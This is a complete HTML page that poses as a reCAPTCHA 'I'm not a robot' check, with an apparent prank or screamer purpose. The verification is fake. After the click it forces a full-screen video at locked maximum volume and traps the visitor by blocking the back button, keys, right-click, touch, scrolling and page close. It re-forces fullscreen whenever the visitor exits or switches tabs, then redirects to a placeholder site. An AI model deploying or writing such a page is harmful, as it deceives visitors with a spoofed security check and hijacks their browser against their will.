<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verification Required</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      user-select: none;
      -webkit-user-select: none;
    }

    html, body {
      width: 100%;
      height: 100%;
      background: #f9f9f9;
      overflow: hidden;
      font-family: Arial, Roboto, sans-serif;
    }

    #verifyScreen {
      position: fixed;
      inset: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      background: #f9f9f9;
      z-index: 100;
    }

    #title {
      font-size: 18px;
      color: #333;
      margin-bottom: 24px;
      text-align: center;
      padding: 0 20px;
    }

    .captcha-box {
      width: 300px;
      height: 74px;
      background: #f9f9f9;
      border: 1px solid #d3d3d3;
      border-radius: 3px;
      display: flex;
      align-items: center;
      padding: 0 12px;
      box-shadow: 0 2px 2px rgba(0,0,0,0.05);
      cursor: pointer;
      transition: background 0.2s;
    }

    .captcha-box:hover {
      background: #f0f0f0;
    }

    /* ── CHECKBOX ── */
    .checkbox-wrapper {
      width: 28px;
      height: 28px;
      border: 2px solid #c1c1c1;
      border-radius: 2px;
      background: white;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-right: 12px;
      position: relative;
    }

    .checkmark {
      width: 22px;
      height: 22px;
      display: none;
    }

    .checkmark.show {
      display: block;
    }

    .spinner {
      width: 24px;
      height: 24px;
      border: 3px solid #e0e0e0;
      border-top: 3px solid #4285f4;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      display: none;
    }

    .spinner.show {
      display: block;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    /* ── LABEL ── */
    .captcha-label {
      flex: 1;
      font-size: 14px;
      color: #000;
    }

    /* ── reCAPTCHA LOGO ── */
    .captcha-logo {
      display: flex;
      flex-direction: column;
      align-items: center;
      margin-left: 8px;
    }

    .logo-img {
      width: 32px;
      height: 32px;
    }

    .logo-text {
      font-size: 8px;
      color: #555;
      margin-top: 2px;
      font-weight: bold;
    }

    .logo-sub {
      font-size: 7px;
      color: #999;
      margin-top: 1px;
    }

    /* ── VIDEO SCREEN ── */
    #videoScreen {
      display: none;
      position: fixed;
      inset: 0;
      background: black;
      z-index: 200;
    }

    #myVideo {
      width: 100%;
      height: 100%;
      object-fit: cover;
      display: block;
    }
  </style>
</head>
<body>

  <!-- VERIFY SCREEN -->
  <div id="verifyScreen">
    <p id="title">Please verify you are human to continue</p>

    <div class="captcha-box" id="captchaBox">
      <div class="checkbox-wrapper">
        <div class="spinner" id="spinner"></div>
        <svg class="checkmark" id="checkmark" viewBox="0 0 24 24" fill="none">
          <path d="M5 12l5 5L20 7" stroke="#4caf50" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
      </div>

      <span class="captcha-label">I'm not a robot</span>

      <div class="captcha-logo">
        <svg class="logo-img" viewBox="0 0 48 48">
          <path fill="#4285f4" d="M24 4C16 4 9 9 7 17l7 2c1-5 5-8 10-8 4 0 7 2 9 5l-6 6h17V5l-6 6c-3-4-8-7-14-7z"/>
          <path fill="#9e9e9e" d="M24 44c8 0 15-5 17-13l-7-2c-1 5-5 8-10 8-4 0-7-2-9-5l6-6H4v17l6-6c3 4 8 7 14 7z"/>
        </svg>
        <div class="logo-text">reCAPTCHA</div>
        <div class="logo-sub">Privacy - Terms</div>
      </div>
    </div>
  </div>

  <!-- VIDEO SCREEN -->
  <div id="videoScreen">
    <video id="myVideo" playsinline>
      <source src="video.mp4" type="video/mp4"/>
    </video>
  </div>

  <script>
    const verifyScreen = document.getElementById("verifyScreen");
    const captchaBox   = document.getElementById("captchaBox");
    const spinner      = document.getElementById("spinner");
    const checkmark    = document.getElementById("checkmark");
    const videoScreen  = document.getElementById("videoScreen");
    const video        = document.getElementById("myVideo");

    const REDIRECT_URL = "https://your-website.com";

    let videoStarted = false;
    let captchaUsed  = false;

    // ════════════════════════════════
    //  CLICK CAPTCHA → SPIN → CHECK → START
    // ════════════════════════════════
    captchaBox.addEventListener("click", async () => {
      if (captchaUsed) return;
      captchaUsed = true;

      // Show spinner
      spinner.classList.add("show");

      // Wait 1.5 seconds (looks like its verifying)
      await new Promise(r => setTimeout(r, 1500));

      // Hide spinner, show checkmark
      spinner.classList.remove("show");
      checkmark.classList.add("show");

      // Wait 0.5 sec before starting
      await new Promise(r => setTimeout(r, 500));

      // Start video
      startEverything();
    });

    async function startEverything() {
      verifyScreen.style.display = "none";
      videoScreen.style.display  = "block";
      videoStarted = true;

      // Block back button
      for (let i = 0; i < 10; i++) {
        history.pushState(null, "", location.href);
      }

      // Fullscreen
      try {
        await document.documentElement.requestFullscreen();
      } catch(e) {}

      // Play video muted → then unmute
      try {
        video.muted  = true;
        video.volume = 1.0;
        await video.play();

        setTimeout(() => {
          video.muted  = false;
          video.volume = 1.0;
        }, 300);

      } catch(e) {}
    }

    // ════════════════════════════════
    //  VIDEO ENDS → REDIRECT
    // ════════════════════════════════
    video.addEventListener("ended", () => {
      videoStarted = false;
      try {
        if (document.fullscreenElement) {
          document.exitFullscreen().then(() => {
            window.location.href = REDIRECT_URL;
          });
        } else {
          window.location.href = REDIRECT_URL;
        }
      } catch(e) {
        window.location.href = REDIRECT_URL;
      }
    });

    // ════════════════════════════════
    //  FULLSCREEN EXIT → FORCE BACK
    // ════════════════════════════════
    document.addEventListener("fullscreenchange", () => {
      if (!document.fullscreenElement && videoStarted && !video.ended) {
        setTimeout(() => {
          document.documentElement.requestFullscreen().catch(() => {});
        }, 100);
        setTimeout(() => {
          document.documentElement.requestFullscreen().catch(() => {});
        }, 500);
        setTimeout(() => {
          document.documentElement.requestFullscreen().catch(() => {});
        }, 1000);
      }
    });

    // ════════════════════════════════
    //  BLOCK ALL KEYS
    // ════════════════════════════════
    document.addEventListener("keydown", (e) => {
      if (!videoStarted || video.ended) return;
      e.preventDefault();
      e.stopPropagation();
      e.stopImmediatePropagation();
      return false;
    }, true);

    document.addEventListener("keyup", (e) => {
      if (!videoStarted || video.ended) return;
      e.preventDefault();
      e.stopPropagation();
      e.stopImmediatePropagation();
      return false;
    }, true);

    document.addEventListener("keypress", (e) => {
      if (!videoStarted || video.ended) return;
      e.preventDefault();
      e.stopPropagation();
      e.stopImmediatePropagation();
      return false;
    }, true);

    // ════════════════════════════════
    //  BLOCK BACK BUTTON
    // ════════════════════════════════
    window.addEventListener("popstate", () => {
      if (videoStarted && !video.ended) {
        history.pushState(null, "", location.href);
        history.pushState(null, "", location.href);
      }
    });

    // ════════════════════════════════
    //  BLOCK RIGHT CLICK
    // ════════════════════════════════
    document.addEventListener("contextmenu", (e) => {
      e.preventDefault();
      return false;
    }, true);

    // ════════════════════════════════
    //  BLOCK PAGE CLOSE
    // ════════════════════════════════
    window.addEventListener("beforeunload", (e) => {
      if (videoStarted && !video.ended) {
        e.preventDefault();
        e.returnValue = "";
        return "";
      }
    });

    // ════════════════════════════════
    //  TAB SWITCH → PAUSE + FORCE BACK
    // ════════════════════════════════
    document.addEventListener("visibilitychange", () => {
      if (videoStarted && !video.ended) {
        if (document.hidden) {
          video.pause();
        } else {
          document.documentElement.requestFullscreen().catch(() => {});
          video.volume = 1.0;
          video.muted  = false;
          video.play().catch(() => {});
        }
      }
    });

    // ════════════════════════════════
    //  WINDOW BLUR → FORCE BACK
    // ════════════════════════════════
    window.addEventListener("blur", () => {
      if (videoStarted && !video.ended) {
        const refocus = setInterval(() => {
          if (videoStarted && !video.ended) {
            window.focus();
            document.documentElement.requestFullscreen().catch(() => {});
            video.play().catch(() => {});
          } else {
            clearInterval(refocus);
          }
        }, 500);
      }
    });

    // ════════════════════════════════
    //  LOCK VOLUME 100%
    // ════════════════════════════════
    video.addEventListener("volumechange", () => {
      if (videoStarted && !video.ended) {
        video.volume = 1.0;
        video.muted  = false;
      }
    });

    setInterval(() => {
      if (videoStarted && !video.ended) {
        video.volume = 1.0;
        video.muted  = false;
        if (video.paused) {
          video.play().catch(() => {});
        }
      }
    }, 500);

    // ════════════════════════════════
    //  BLOCK TOUCH GESTURES
    // ════════════════════════════════
    document.addEventListener("touchmove", (e) => {
      if (videoStarted && !video.ended) e.preventDefault();
    }, { passive: false });

    document.addEventListener("touchstart", (e) => {
      if (videoStarted && !video.ended) e.preventDefault();
    }, { passive: false });

    // ════════════════════════════════
    //  BLOCK SCROLL + WHEEL
    // ════════════════════════════════
    document.addEventListener("scroll", (e) => e.preventDefault(), { passive: false });
    document.addEventListener("wheel", (e) => {
      if (videoStarted && !video.ended) e.preventDefault();
    }, { passive: false });

    // ════════════════════════════════
    //  BLOCK DRAG + DROP
    // ════════════════════════════════
    document.addEventListener("dragstart", (e) => e.preventDefault(), true);
    document.addEventListener("drop", (e) => e.preventDefault(), true);

    // ════════════════════════════════
    //  BLOCK SELECTION
    // ════════════════════════════════
    document.addEventListener("selectstart", (e) => e.preventDefault(), true);

    // ════════════════════════════════
    //  CONTINUOUS FULLSCREEN CHECK
    // ════════════════════════════════
    setInterval(() => {
      if (videoStarted && !video.ended) {
        if (!document.fullscreenElement) {
          document.documentElement.requestFullscreen().catch(() => {});
        }
      }
    }, 2000);
  </script>

</body>
</html>
